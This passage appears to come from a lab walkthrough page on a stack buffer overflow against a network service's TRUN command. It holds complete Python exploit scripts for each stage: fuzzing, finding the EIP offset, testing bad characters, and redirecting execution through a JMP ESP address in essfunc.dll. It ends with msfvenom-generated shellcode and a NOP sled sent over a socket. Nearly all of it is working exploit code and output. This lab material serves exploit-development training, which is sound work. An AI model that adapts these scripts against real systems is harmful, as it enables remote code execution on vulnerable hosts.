[+] Sending buffer: 209 bytes
[+] Sending buffer: 309 bytes
[+] Sending buffer: 409 bytes
[+] Sending buffer: 509 bytes
[+] Sending buffer: 609 bytes
[+] Sending buffer: 709 bytes
[+] Sending buffer: 809 bytes
[+] Sending buffer: 909 bytes
[+] Sending buffer: 1009 bytes
[+] Sending buffer: 1109 bytes
[+] Sending buffer: 1209 bytes
[+] Sending buffer: 1309 bytes
[+] Sending buffer: 1409 bytes
[+] Sending buffer: 1509 bytes
[+] Sending buffer: 1609 bytes
[+] Sending buffer: 1709 bytes
[+] Sending buffer: 1809 bytes
[+] Sending buffer: 1909 bytes
[+] Sending buffer: 2009 bytes
[+] Sending buffer: 2109 bytes
[!] Unable to connect to the application.
</code></pre><h2 id=find-eip-offset>Find EIP Offset</h2><pre><code>root@kali:/mnt/hgfs/_shared_folder/BO# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
</code></pre><pre><code class=language-python>#!/usr/bin/python 

import socket,sys

address = '192.168.136.130'
port    = 9999

#offset  = around 2100

pattern = b&quot;Aa0Aa1Aa...Cv0Cv1Cv2C&quot;  # Snipped output of pattern_create.rb
buff    = b&quot;&quot;              # empty byte var
buff    = b&quot;%s&quot; % pattern  # add pattern to buff

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b&quot;TRUN /.:/%s&quot; % buff) 
except RuntimeError as Err:
	print(f'[!] Unable to connect to the application. {err}')
	sys.exit(0)
finally:
	s.close()

</code></pre><p>EIP value: 386f4337 (8oC7)</p><pre><code class=language-bash>root@kali:/mnt/hgfs/_shared_folder/BO /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 386f4337
[*] Exact match at offset 2003
</code></pre><h3 id=controlling-the-esp>Controlling the ESP</h3><pre><code class=language-python>#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003 

buff  = b&quot;&quot;         # empty byte var
buff += b'A'*offset # junk
buff += b'B'*4      # EIP
buff += b'C'*256    # some more junk on stack after EIP which we want to eventually store our shellcode and jump to.
buff += b'D'*256    # this also gives us an idea of how much space we have on the stack.
buff += b'E'*128    # 
buff += b'F'*128    # 
buff += b'G'*64     # 
buff += b'H'*64     # 
buff += b'I'*32     # 
buff += b'J'*32     # 

print(buff)

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b&quot;TRUN /.:/%s&quot; % buff) 
except RuntimeError as err:
	print(f'[!] Unable to connect to the application.')
	sys.exit(0)
finally:
	s.close()

</code></pre><h2 id=finding-bad-characters>Finding Bad Characters</h2><pre><code class=language-python>#!/usr/bin/python 

import socket,sys

address = '192.168.136.130'
port    = 9999

command = b'TRUN /.:/'
offset  = 2003

bad_chars = [0x00]
chars = b&quot;&quot;
for i in range(0x00,0xFF+1):
    if i not in bad_chars:
        chars += bytes([i])

buff  = b&quot;&quot;         # empty byte var
buff += b&quot;A&quot;*offset # junk
buff += b&quot;B&quot;*4      # EIP
buff += b&quot;&quot; + chars # test for chars

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b&quot;TRUN /.:/%s&quot; % buff) 
except RuntimeError as err:
	print(f'[!] Unable to connect to the application. {err}')
	sys.exit(0)
finally:
	s.close()
</code></pre><p>no bad chars</p><h2 id=find-jmp-esp>Find JMP ESP</h2><p><code>!mona modules</code></p><p>essfunc.dll</p><pre><code>root@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm &gt; JMP ESP
00000000  FFE4              jmp esp
nasm &gt;
</code></pre><p><code>!mona find -s "\xFF\xE4" -m essfunc.dll</code></p><p><code>625011af</code></p><pre><code class=language-python>#!/usr/bin/python 

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

shellcode = b&quot;C&quot;*256

buff  = b&quot;&quot;                 # empty byte var
buff += b&quot;A&quot;*offset         # junk
buff += b&quot;\xAF\x11\x50\x62&quot; # EIP to JMP ESP
buff += b'C'*256            # some more junk on stack after EIP which we want to eventually store our shellcode and jump to.
buff += b'D'*256            # this also gives us an idea of how much space we have on the stack.
buff += b'E'*128            # 
buff += b'F'*128            # 
buff += b'G'*64             # 
buff += b'H'*64             # 
buff += b'I'*32             # 
buff += b'J'*32             # 

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b&quot;TRUN /.:/%s&quot; % buff) 
except RuntimeError as err:
	print(f'[!] Unable to connect to the application. {err}')
	sys.exit(0)
finally:
	s.close()

</code></pre><h2 id=generate-shellcode>Generate Shellcode</h2><pre><code>root@kali:/mnt/hgfs/_shared_folder/BO# msfvenom -p windows/exec CMD=calc.exe -b '\x00\' -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of c file: 949 bytes
unsigned char buf[] = 
&quot;\xbb\xbb\x2a\xfd\xc1\xdb\xd4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1&quot;
&quot;\x31\x83\xed\xfc\x31\x5d\x0f\x03\x5d\xb4\xc8\x08\x3d\x22\x8e&quot;
&quot;\xf3\xbe\xb2\xef\x7a\x5b\x83\x2f\x18\x2f\xb3\x9f\x6a\x7d\x3f&quot;
&quot;\x6b\x3e\x96\xb4\x19\x97\x99\x7d\x97\xc1\x94\x7e\x84\x32\xb6&quot;
&quot;\xfc\xd7\x66\x18\x3d\x18\x7b\x59\x7a\x45\x76\x0b\xd3\x01\x25&quot;
&quot;\xbc\x50\x5f\xf6\x37\x2a\x71\x7e\xab\xfa\x70\xaf\x7a\x71\x2b&quot;
&quot;\x6f\x7c\x56\x47\x26\x66\xbb\x62\xf0\x1d\x0f\x18\x03\xf4\x5e&quot;
&quot;\xe1\xa8\x39\x6f\x10\xb0\x7e\x57\xcb\xc7\x76\xa4\x76\xd0\x4c&quot;
&quot;\xd7\xac\x55\x57\x7f\x26\xcd\xb3\x7e\xeb\x88\x30\x8c\x40\xde&quot;
&quot;\x1f\x90\x57\x33\x14\xac\xdc\xb2\xfb\x25\xa6\x90\xdf\x6e\x7c&quot;
&quot;\xb8\x46\xca\xd3\xc5\x99\xb5\x8c\x63\xd1\x5b\xd8\x19\xb8\x31&quot;
&quot;\x1f\xaf\xc6\x77\x1f\xaf\xc8\x27\x48\x9e\x43\xa8\x0f\x1f\x86&quot;
&quot;\x8d\xe0\x55\x8b\xa7\x68\x30\x59\xfa\xf4\xc3\xb7\x38\x01\x40&quot;
&quot;\x32\xc0\xf6\x58\x37\xc5\xb3\xde\xab\xb7\xac\x8a\xcb\x64\xcc&quot;
&quot;\x9e\xaf\xeb\x5e\x42\x1e\x8e\xe6\xe1\x5e&quot;;
</code></pre><pre><code class=language-python>#!/usr/bin/python 

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

shellcode = b&quot;\xbb\xbb\x2a\xfd\xc1\xdb\xd4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x31\x83\xed\xfc\x31\x5d\x0f\x03\x5d\xb4\xc8\x08\x3d\x22\x8e\xf3\xbe\xb2\xef\x7a\x5b\x83\x2f\x18\x2f\xb3\x9f\x6a\x7d\x3f\x6b\x3e\x96\xb4\x19\x97\x99\x7d\x97\xc1\x94\x7e\x84\x32\xb6\xfc\xd7\x66\x18\x3d\x18\x7b\x59\x7a\x45\x76\x0b\xd3\x01\x25\xbc\x50\x5f\xf6\x37\x2a\x71\x7e\xab\xfa\x70\xaf\x7a\x71\x2b\x6f\x7c\x56\x47\x26\x66\xbb\x62\xf0\x1d\x0f\x18\x03\xf4\x5e\xe1\xa8\x39\x6f\x10\xb0\x7e\x57\xcb\xc7\x76\xa4\x76\xd0\x4c\xd7\xac\x55\x57\x7f\x26\xcd\xb3\x7e\xeb\x88\x30\x8c\x40\xde\x1f\x90\x57\x33\x14\xac\xdc\xb2\xfb\x25\xa6\x90\xdf\x6e\x7c\xb8\x46\xca\xd3\xc5\x99\xb5\x8c\x63\xd1\x5b\xd8\x19\xb8\x31\x1f\xaf\xc6\x77\x1f\xaf\xc8\x27\x48\x9e\x43\xa8\x0f\x1f\x86\x8d\xe0\x55\x8b\xa7\x68\x30\x59\xfa\xf4\xc3\xb7\x38\x01\x40\x32\xc0\xf6\x58\x37\xc5\xb3\xde\xab\xb7\xac\x8a\xcb\x64\xcc\x9e\xaf\xeb\x5e\x42\x1e\x8e\xe6\xe1\x5e&quot;

buff  = b&quot;&quot;                 # empty byte var
buff += b&quot;A&quot;*offset         # junk
buff += b&quot;\xAF\x11\x50\x62&quot; # EIP to JMP ESP
buff += b&quot;\x90&quot;*32          # NOP sled
buff += b&quot;%s&quot; % shellcode   # add shellcode to buffer

try:
	print(f'[+] Sending buffer: {str(len(buff))} bytes')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(b&quot;TRUN /.:/%s&quot; % buff)
except RuntimeError as err:
	print(f'[!] Unable to connect to the application. {err}')
	sys.exit(0)
finally:
	s.close()
</code></pre><h2 id=exploit>Exploit</h2><footer class=footline></footer></div></div><div id=navigation></div></section><div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px><div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div></div><script src=/js/clipboard.min.js></script><script src=/js/perfect-scrollbar.min.js></script><script src=/js/perfect-scrollbar.jquery.min.js></script><script src=/js/jquery.sticky.js></script><script src=/js/featherlight.min.js></script><script src=/js/highlight.pack.js></script><script>hljs.initHighlightingOnLoad();</script><script src=/js/modernizr.custom-3.6.0.js></script><script src=/js/learn.js></script><script src=/js/hugo-learn.js></script><link href=/mermaid/mermaid.css rel=stylesheet><script src=/mermaid/mermaid.js></script><script>mermaid.initialize({startOnLoad:true});</script></body></html>